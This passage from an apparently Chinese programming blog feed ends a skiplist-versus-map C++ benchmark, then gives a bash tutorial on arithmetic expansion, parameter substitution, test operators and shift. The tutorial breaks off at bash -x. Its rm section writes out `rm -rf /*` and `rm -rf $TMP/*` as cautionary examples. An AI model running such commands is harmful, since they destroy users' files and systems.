skip_erase_time=CClock::<span class="hljs-built_in">time_duration</span>();<br><br>    <span class="hljs-comment">// 测试map erase</span><br>    CClock::<span class="hljs-built_in">start_timeclock</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n; i &gt;=<span class="hljs-number">0</span>; --i)&#123;<br>        mp.<span class="hljs-built_in">erase</span>(<span class="hljs-built_in">rand</span>()%n);<br>    &#125;<br>    CClock::<span class="hljs-built_in">stop_timeclock</span>();<br>    <span class="hljs-keyword">auto</span> map_erase_time=CClock::<span class="hljs-built_in">time_duration</span>();<br><br>    cout&lt;&lt;<span class="hljs-string">&quot;SkipList insert time: &quot;</span>&lt;&lt;skiplist_insert_time&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;SkipList find time: &quot;</span>&lt;&lt;skip_find_time&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;SkipList erase time: &quot;</span>&lt;&lt;skip_erase_time&lt;&lt;endl;<br>    cout&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;Map insert time: &quot;</span>&lt;&lt;map_insert_time&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;Map find time: &quot;</span>&lt;&lt;map_find_time&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;Map erase time: &quot;</span>&lt;&lt;map_erase_time&lt;&lt;endl;<br><br>    cout&lt;&lt;<span class="hljs-string">&quot;SkipList size: &quot;</span>&lt;&lt;sk.<span class="hljs-built_in">size</span>()&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;Map size: &quot;</span>&lt;&lt;mp.<span class="hljs-built_in">size</span>()&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>我机器上测试 随机插入/查找/删除，结果仅供参考。单位秒</p>
<table>
<thead>
<tr>
<th></th>
<th>insert</th>
<th>find</th>
<th>erase</th>
</tr>
</thead>
<tbody>
<tr>
<td>skiplist1</td>
<td>1.44737</td>
<td>2.03802</td>
<td>2.158</td>
</tr>
<tr>
<td>skiplist2</td>
<td>1.34377</td>
<td>1.61364</td>
<td>1.52145</td>
</tr>
<tr>
<td>skiplist3</td>
<td>1.35671</td>
<td>2.31105</td>
<td>1.57659</td>
</tr>
<tr>
<td>map1</td>
<td>1.48519</td>
<td>1.28156</td>
<td>1.93228</td>
</tr>
<tr>
<td>map2</td>
<td>1.00754</td>
<td>1.099</td>
<td>1.29245</td>
</tr>
<tr>
<td>map3</td>
<td>1.23837</td>
<td>1.28021</td>
<td>1.35214</td>
</tr>
</tbody>
</table>
<p>由此可见，跳跃表也是很高效的一种数据结构</p>
<p>skiplist源码地址: <a href="https://github.com/josexy/skiplist_c">https://github.com/josexy/skiplist_c</a></p>
<h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3>
<p><a href="https://en.wikipedia.org/wiki/Skip_list">维基百科-skiplist</a><br />
<a href="https://www.cl.cam.ac.uk/teaching/0506/Algorithms/skiplists.pdf">Skip Lists: A Probabilistic Alternative toBalanced Trees</a><br />
<a href="https://blog.csdn.net/ict2014/article/details/17394259">浅析SkipList跳跃表原理及代码实现</a></p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Unix/Linux Shell</title>
    <url>/unix-linux-shell/</url>
    <content><![CDATA[<p>本文主要是参考书上内容并总结出来的，因此无法全面概述每一个shell的使用，具体可以<code>man</code>查看帮助。👀</p>
<span id="more"></span>
<h3 id="rm"><a class="markdownIt-Anchor" href="#rm"></a> rm</h3>
<p>玩过linux都知道 <code>rm</code> 这个命令，它是用来删除一个或多个文件/目录，一般常用的操作是 <code>rm files</code>。不过有时为了省事，直接 <code>rm -rf files/dirs</code>表示强制删除文件或目录(包括子目录所有文件)。<br />
不过有时候突然sb了，直接执行 <code>rm -rf /*</code> ，除非反应在0.000000009ms内否则基本就GG了，还要一种写法也可能GG，比如: <code>rm -rf $TMP/*</code>，如果变量<code>$TMP</code> <strong>不存在或为空</strong>，那么这条命令等价于<code>rm -rf /*</code>。。。<br />
总之，rm就是万恶之源，远离rm，从我做起 🤣</p>
<h3 id="变量初始化空值"><a class="markdownIt-Anchor" href="#变量初始化空值"></a> 变量初始化空值</h3>
<p>Linux变量初始化为空值有3种形式，效果一样。</p>
<ul>
<li><code>var=</code></li>
<li><code>var=&quot;&quot;</code> (无空格)</li>
<li><code>var=''</code> (无空格)</li>
</ul>
<h3 id="整数算数操作"><a class="markdownIt-Anchor" href="#整数算数操作"></a> 整数算数操作 $(())、$[]</h3>
<p>基本上linux shell提供了一种叫做<strong>算术扩展</strong>的机制能够执行shell变量的<strong>整数</strong>运算。（PS: bash仅支持整数，而zsh其实支持浮点数的。以下所有命令及结果均在bash上测试）<br />
格式: <code>$((expression))</code> 或 <code>$[expression]</code> expression表达式首尾可无空格<br />
<code>$(())</code> 支持 +、-、<em>、/、%、**(幂)、+=、-=、</em>=、/=、var++、var–、++var、–var<br />
除此之外，<code>$(())</code>也支持进制之间的转换（转换为10进制）。即 <code>$((基数#转换的值))</code></p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> $((<span class="hljs-number">1</span>+<span class="hljs-number">20</span>*<span class="hljs-number">2</span>))     <span class="hljs-comment"># 41</span><br><br>var=100<br><span class="hljs-built_in">echo</span> $((var+=<span class="hljs-number">100</span>))   <span class="hljs-comment"># 200</span><br><br><span class="hljs-built_in">echo</span> $((var+<span class="hljs-number">100</span>))<br><span class="hljs-built_in">echo</span> $((<span class="hljs-variable">$var</span>+<span class="hljs-number">100</span>))   <span class="hljs-comment"># $非必需</span><br><br><span class="hljs-built_in">echo</span> $((<span class="hljs-number">2#11111111</span>)) <span class="hljs-comment"># 输出 255 </span><br><span class="hljs-built_in">echo</span> $((<span class="hljs-number">8#377</span>))      <span class="hljs-comment"># 输出 255</span><br><span class="hljs-built_in">echo</span> $((<span class="hljs-number">16#ff</span>))      <span class="hljs-comment"># 输出 255</span><br><span class="hljs-built_in">echo</span> $((<span class="hljs-number">10#255</span>))     <span class="hljs-comment"># 输出 255</span><br><span class="hljs-built_in">echo</span> $((<span class="hljs-number">3#22</span>))       <span class="hljs-comment"># 输出 8 </span><br>var=ff<br><span class="hljs-built_in">echo</span> $((<span class="hljs-number">16</span>#<span class="hljs-variable">$var</span>))    <span class="hljs-comment"># 输出 255</span><br><br><span class="hljs-built_in">echo</span> $((<span class="hljs-number">10</span>!=<span class="hljs-number">10</span>&amp;&amp;var&gt;<span class="hljs-number">100</span>))  <span class="hljs-comment"># 甚至还可以逻辑判断</span><br></code></pre></div></td></tr></table></figure>
<p>除此之外，可以在if/for内进行求和，比如下面这个简短的例子，其中 <code>:</code> 不能去掉，因为如果没有<code>:</code>那么<code>$((sum+=i))</code>被当作一条命令去执行，而这里我们只需要求和，没有执行什么shell命令，于是bash只能报错<code>未找到命令</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>sum=<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..100&#125;;<span class="hljs-keyword">do</span><br>        : $((sum+=i))<br><span class="hljs-keyword">done</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$sum</span><br></code></pre></div></td></tr></table></figure>
<h3 id="命令替换"><a class="markdownIt-Anchor" href="#命令替换"></a> 命令替换 $()</h3>
<p>众所周知，linux通过 <code>$()</code> 和 <code>` `</code>来执行一些命令，比如<code>echo $(date)</code> <code>echo `date`</code>，这在shell脚本中很常见，可以保存输出结果到变量中。</p>
<h3 id="变量替换"><a class="markdownIt-Anchor" href="#变量替换"></a> 变量替换 ${}</h3>
<p>所谓的变量替换也就是把变量放在用双引号<code>&quot;&quot;</code>字符串而不是单引号<code>''</code>字符串中。这是因为单引号表示告诉shell忽略字符串中的<strong>特殊字符</strong>，比如<code>$</code><br />
比如</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">num=666<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;number: <span class="hljs-variable">$&#123;num&#125;</span>000&quot;</span>        <span class="hljs-comment"># number: 666000</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;number: $&#123;num&#125;000&#x27;</span>        <span class="hljs-comment"># number: $&#123;num&#125;000</span><br></code></pre></div></td></tr></table></figure>
<h3 id="参数替换"><a class="markdownIt-Anchor" href="#参数替换"></a> 参数替换</h3>
<p>shell中参数包括：传递给程序的参数（位置参数，比如$0、$1…）、特殊的shell变量（如 $#）和普通变量（关键字参数）</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>${parameter}</td>
<td>替换为parameter的值</td>
</tr>
<tr>
<td>${parameter:-value}</td>
<td>如果parameter已设置且不为空，替换为它的值；否则，替换为 value</td>
</tr>
<tr>
<td>${parameter-value}</td>
<td>如果parameter已设置，替换为它的值；否则，替换为 value</td>
</tr>
<tr>
<td>${parameter:=value}</td>
<td>如果parameter已设置且不为空，替换为它的值；否则，替换为 value并将其赋给parameter</td>
</tr>
<tr>
<td>${parameter=value}</td>
<td>如果parameter已设置，替换为它的值；否则，替换为 value并将其赋给parameter</td>
</tr>
<tr>
<td>${parameter:?value}</td>
<td>如果parameter已设置且不为空，替换为它的值；否则，将value写入标准错误并退出。若忽略value，则向标准错误写入parameter: parameter null or not set</td>
</tr>
<tr>
<td>${parameter?value}</td>
<td>如果parameter已设置，替换为它的值；否则，将value写入标准错误并退出。若忽略value，则向标准错误写入parameter: parameter null or not set</td>
</tr>
<tr>
<td>${parameter:+value}</td>
<td>如果parameter已设置且不为空，替换为value；否则，替换为空</td>
</tr>
<tr>
<td>${parameter+value}</td>
<td>如果parameter已设置，替换为value；否则，替换为空</td>
</tr>
<tr>
<td>${ #parameter}</td>
<td>求parameter的<strong>长度</strong></td>
</tr>
<tr>
<td>${parameter#pattern}</td>
<td>从parameter<strong>左边</strong>开始<strong>删除</strong>pattern的<strong>最短</strong>匹配，余下内容作为参数替换的结果</td>
</tr>
<tr>
<td>${parameter##pattern}</td>
<td>从parameter<strong>左边</strong>开始<strong>删除</strong>pattern的<strong>最长</strong>匹配，余下内容作为参数替换的结果</td>
</tr>
<tr>
<td>${parameter%pattern}</td>
<td>从parameter<strong>右边</strong>开始<strong>删除</strong>pattern的<strong>最短</strong>匹配，余下内容作为参数替换的结果</td>
</tr>
<tr>
<td>${parameter%%pattern}</td>
<td>从parameter<strong>右边</strong>开始<strong>删除</strong>pattern的<strong>最长</strong>匹配，余下内容作为参数替换的结果</td>
</tr>
</tbody>
</table>
<p>通过 <code>set</code> 命令可以为位置参数重新赋值。<br />
如 <code>set a b 123</code>，这将<code>a</code>赋值给<code>$1</code>、<code>b</code>赋值给<code>$2</code>、<code>123</code>赋值给<code>$3</code>。<br />
还可以将输入的每个数据依次分配到位置参数<code>$1</code>、<code>$2</code>…</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">read</span> line<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$line</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$#</span><br><span class="hljs-keyword">for</span> args; <span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-variable">$args</span><br><span class="hljs-keyword">done</span><br></code></pre></div></td></tr></table></figure>
<h3 id="数学等式解算器expr"><a class="markdownIt-Anchor" href="#数学等式解算器expr"></a> 数学等式解算器expr</h3>
<p>expr命令没有$(())高级，功能比较局限而且也只支持整数。expr除了支持基本的 ±*/外，还支持|、&amp;、!=、=、&lt;=、&lt;、&gt;=、&gt;逻辑判断。需要用空格分隔参数，而且乘的话需要用<code>\</code>转义！注意不要理所当然地用 <code>&quot;&quot;</code> 来包围表达式，这没用</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">expr 10 + 10 \* 10 / 20   <span class="hljs-comment"># 输出 15</span><br>expr <span class="hljs-string">&quot;10 + 10 * 10 / 20&quot;</span>  <span class="hljs-comment"># 输出 10 + 10 * 10 / 20</span><br><br>var=100<br>expr <span class="hljs-variable">$var</span> + 100           <span class="hljs-comment"># 输出 200</span><br>i=`expr <span class="hljs-variable">$var</span> + 100`       <span class="hljs-comment"># i=200</span><br><br></code></pre></div></td></tr></table></figure>
<p>当然expr还有其他功能，比如</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 默认返回匹配到的字符数目</span><br>expr <span class="hljs-string">&quot;i love linux&quot;</span> : <span class="hljs-string">&quot;.*&quot;</span>          <span class="hljs-comment"># 12</span><br><span class="hljs-comment"># 等同于</span><br>expr length <span class="hljs-string">&quot;i love linux&quot;</span>          <span class="hljs-comment"># 12</span><br><br><span class="hljs-comment"># 返回某个字符在字符串中的索引(从1开始)</span><br>expr index <span class="hljs-string">&quot;i love linux&quot;</span>  o        <span class="hljs-comment"># 4</span><br><br><span class="hljs-comment"># 提取索引为8的5个字符的子字符串</span><br>expr substr <span class="hljs-string">&quot;i love linux&quot;</span>  8 5     <span class="hljs-comment"># linux</span><br></code></pre></div></td></tr></table></figure>
<h3 id="传递参数"><a class="markdownIt-Anchor" href="#传递参数"></a> 传递参数</h3>
<p>可以给一个shell脚本或<strong>函数</strong>传递参数，与获取参数有关的一些变量大致如下</p>
<table>
<thead>
<tr>
<th>变量</th>
<th></th>
<th>变量</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>$#</td>
<td>参数个数</td>
<td>${1}~${n}</td>
<td>参数1~n</td>
</tr>
<tr>
<td>$*</td>
<td>所有原始参数</td>
<td>$@</td>
<td>所有参数且每个参数用<code>&quot;&quot;</code>包围,如果<code>&quot;$1&quot;</code></td>
</tr>
</tbody>
</table>
<p>当然还有其他的变量没有列出。</p>
<h4 id="shift"><a class="markdownIt-Anchor" href="#shift"></a> shift</h4>
<p>shift命令可以左移位置参数，即解开参数包，每次执行<code>shift</code> <code>$#</code>自动减1,<code>$2</code>赋予给<code>$1</code>，<code>$3</code>赋予给<code>$2</code>… 当<code>$#=0</code>，没有参数可解时报错，具体情况根据shell的不同而不同。比如我这里bash没有显示报错信息，但<code>$?</code>为1，而zsh显示报错信息且<code>$?</code>为1。这个例子展示了如何利用shift一次解开参数包，当然也可以用<code>$&#123;1&#125;～$&#123;n&#125;</code></p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$@</span>;<span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;=&gt; &#123;<span class="hljs-variable">$1</span>&#125;&quot;</span><br>        <span class="hljs-built_in">shift</span><br><span class="hljs-keyword">done</span> <br><span class="hljs-built_in">shift</span>                   <span class="hljs-comment"># error</span><br><span class="hljs-built_in">echo</span> $?<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;quit&quot;</span><br><br>$ test.sh this is a <span class="hljs-built_in">test</span> <br>Output<br>=&gt; &#123;this&#125;<br>=&gt; &#123;is&#125;<br>=&gt; &#123;a&#125;<br>=&gt; &#123;<span class="hljs-built_in">test</span>&#125;<br>1<br>quit<br></code></pre></div></td></tr></table></figure>
<h3 id="条件测试test"><a class="markdownIt-Anchor" href="#条件测试test"></a> 条件测试test</h3>
<p>test命令可以用来测试两个<strong>字符串</strong>是否相等，而且test会把测试变量当作字符串来看待，也就是说 <code>test 100 = 100</code>实际上是<code>test &quot;100&quot; = &quot;100&quot;</code>或者 <code>test &quot;100&quot; = 100</code>。<br />
由于测试的结果是上一条命令执行的退出状态码，因此结果普遍是0真，非0假。</p>
<p>test 字符串的其他一些操作符</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>str1 = str2</td>
<td>str1 等于 str2 ?</td>
</tr>
<tr>
<td>str1 != str2</td>
<td>str1 不等于 str2 ?</td>
</tr>
<tr>
<td>str</td>
<td>str 不为空?</td>
</tr>
<tr>
<td>-n str</td>
<td>str不为空 ?</td>
</tr>
<tr>
<td>-z str</td>
<td>str为空 ?</td>
</tr>
</tbody>
</table>
<p>关于<code>str</code>和<code>-n str</code>区别，举一个例子就知道了</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">str=<span class="hljs-string">&quot;    &quot;</span><br><span class="hljs-built_in">test</span> <span class="hljs-variable">$str</span><br><span class="hljs-built_in">echo</span> $?         <span class="hljs-comment"># 1</span><br><br><span class="hljs-built_in">test</span> -n <span class="hljs-variable">$str</span><br><span class="hljs-built_in">echo</span> $?         <span class="hljs-comment"># 0</span><br></code></pre></div></td></tr></table></figure>
<p>即可以把<code>-n str</code>看作是测试字符串长度是否大于0。</p>
<h3 id="条件测试"><a class="markdownIt-Anchor" href="#条件测试"></a> 条件测试 []、[[]]、(())</h3>
<p>除了在if中用test判断条件之外，还可以用<code>[ ]</code>和<code>[[ ]]</code>测试条件。<br />
注意，<code>[</code>是一个命令位于 <code>/usr/bin/[</code> ，而<code>[[ ]]</code> 是bash的一个关键字。注意<code>[</code>和<code>]</code>内首尾空格。<br />
常规写法</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">var=<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;linux&quot;</span> = <span class="hljs-string">&quot;linux&quot;</span> &amp;&amp; <span class="hljs-built_in">test</span> -z <span class="hljs-variable">$var</span> ;<span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;yes&quot;</span><br><span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;no&quot;</span><br><span class="hljs-keyword">fi</span><br></code></pre></div></td></tr></table></figure>
<p>使用<code>[ ]</code></p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">var=<br>n=100<br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;linux&quot;</span> = <span class="hljs-string">&quot;linux&quot;</span> ] &amp;&amp; [ -z <span class="hljs-variable">$var</span> ] || [ <span class="hljs-variable">$n</span> -ge 50 ];<span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;yes&quot;</span><br><span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;no&quot;</span><br><span class="hljs-keyword">fi</span><br><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;linux&quot;</span> = <span class="hljs-string">&quot;linux&quot;</span> -a -z <span class="hljs-variable">$var</span> -o <span class="hljs-variable">$n</span> -ge 50 ];<span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;yes&quot;</span><br><span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;no&quot;</span><br><span class="hljs-keyword">fi</span><br></code></pre></div></td></tr></table></figure>
<p>上面两种写法不够简洁，因此可以使用<code>[[ ]]</code></p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">var=<br>n=100<br><span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;linux&quot;</span> = <span class="hljs-string">&quot;linux&quot;</span> &amp;&amp; -z <span class="hljs-variable">$var</span> || <span class="hljs-variable">$n</span>&gt;=50 ]];<span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;yes&quot;</span><br><span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;no&quot;</span><br><span class="hljs-keyword">fi</span><br></code></pre></div></td></tr></table></figure>
<p>甚至还可以使用C风格的条件判断</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sum=<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..100&#125;;<span class="hljs-keyword">do</span><br>        <span class="hljs-keyword">if</span> ((i%2==0));<span class="hljs-keyword">then</span><br>                : $((sum+=i))<br>        <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br></code></pre></div></td></tr></table></figure>
<h3 id="整数比较"><a class="markdownIt-Anchor" href="#整数比较"></a> 整数比较</h3>
<table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>n1 -eq n2</td>
<td>n1 等于 n2 ?</td>
</tr>
<tr>
<td>n1 -ne n2</td>
<td>n1 不等于 n2 ?</td>
</tr>
<tr>
<td>n1 -ge n2</td>
<td>n1 大于等于 n2 ?</td>
</tr>
<tr>
<td>n1 -gt n2</td>
<td>n1 大于 n2 ?</td>
</tr>
<tr>
<td>n1 -le n2</td>
<td>n1 小于等于 n2 ?</td>
</tr>
<tr>
<td>n1 -lt n2</td>
<td>n1 小于 n2 ?</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">x1=<span class="hljs-string">&quot;005&quot;</span><br>x2=<span class="hljs-string">&quot;  10&quot;</span><br>[ <span class="hljs-string">&quot;<span class="hljs-variable">$x1</span>&quot;</span> = 5 ]<br><span class="hljs-built_in">echo</span> $?                <span class="hljs-comment"># 1</span><br><br>[ <span class="hljs-string">&quot;<span class="hljs-variable">$x1</span>&quot;</span> -eq 5]<br><span class="hljs-built_in">echo</span> $?                <span class="hljs-comment"># 0</span><br><br>[ <span class="hljs-string">&quot;<span class="hljs-variable">$x2</span>&quot;</span> = 10 ]<br><span class="hljs-built_in">echo</span> $?                <span class="hljs-comment"># 1</span><br><br>[ <span class="hljs-string">&quot;<span class="hljs-variable">$x2</span>&quot;</span> -eq 10]<br><span class="hljs-built_in">echo</span> $?                <span class="hljs-comment"># 0</span><br></code></pre></div></td></tr></table></figure>
<p>总之，在比较字符串和整数时要注意操作符</p>
<h3 id="文件操作符"><a class="markdownIt-Anchor" href="#文件操作符"></a> 文件操作符</h3>
<table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-d file</td>
<td>file是一个目录</td>
</tr>
<tr>
<td>-e file</td>
<td>file存在</td>
</tr>
<tr>
<td>-f file</td>
<td>file是一个普通文件</td>
</tr>
<tr>
<td>-s file</td>
<td>file不是空文件</td>
</tr>
<tr>
<td>-r file</td>
<td>file可读</td>
</tr>
<tr>
<td>-w file</td>
<td>file可写</td>
</tr>
<tr>
<td>-x file</td>
<td>file可执行</td>
</tr>
<tr>
<td>-L file</td>
<td>file是一个符号链接</td>
</tr>
<tr>
<td>-g file</td>
<td>file设置了SGID位</td>
</tr>
<tr>
<td>-u file</td>
<td>file设置了SUID位</td>
</tr>
<tr>
<td>-p file</td>
<td>file是一个命名管道</td>
</tr>
<tr>
<td>-S file</td>
<td>file是一个套接字</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[ ! -w /usr/bin/[ ]<br><span class="hljs-built_in">echo</span> $?                 <span class="hljs-comment"># 0</span><br><br><span class="hljs-keyword">if</span> [ -d . -a -x test.sh -o -w test.sh ] ; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> ok ;<span class="hljs-keyword">fi</span><br><span class="hljs-comment"># 用括号改变求值顺序</span><br><span class="hljs-keyword">if</span> [ -d . -a \( -x test.sh -o -w test.sh \) ] ; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> ok ;<span class="hljs-keyword">fi</span><br></code></pre></div></td></tr></table></figure>
<h3 id="调试选项-x"><a class="markdownIt-Anchor" href="#调试选项-x"></a> 调试选项 -x</h3>
<p>bash可以制定-x选项来跟踪执行过程，比如有下面这个shell脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>sum=<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..5&#125;;<span class="hljs-keyword">do</span><br>        <span class="hljs-keyword">if</span> ((i%2==0));<span class="hljs-keyword">then</span><br>                : $((sum+=i))<br>        <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$sum</span><br></code></pre></div></td></tr></table></figure>
<p>通过 bash -x <a href="http://test.sh">test.sh</a> 跟踪执行过程</p>
